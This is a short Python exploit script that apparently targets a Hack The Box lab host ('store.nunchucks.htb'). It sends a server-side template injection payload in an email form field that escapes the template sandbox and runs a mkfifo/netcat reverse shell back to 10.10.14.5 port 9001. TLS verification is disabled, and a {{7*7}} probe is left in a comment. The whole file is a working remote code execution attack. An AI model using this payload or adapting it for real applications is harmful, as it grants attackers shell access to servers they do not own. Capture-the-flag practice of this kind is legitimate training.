#!/usr/bin/python3

import requests
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def email_submit(url, endpoint):

	#payload = "{{7*7}}"
    # Reverse Shell 
	payload = '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 9001 >/tmp/f\')")()}}'

	data = {
		"email": payload,
	}

	r = requests.post(url + endpoint, data=data, verify=False)

	print(r.text)


if __name__ == '__main__':
	url = "https://store.nunchucks.htb"
	endpoint = "/api/submit"

	email_submit(url, endpoint)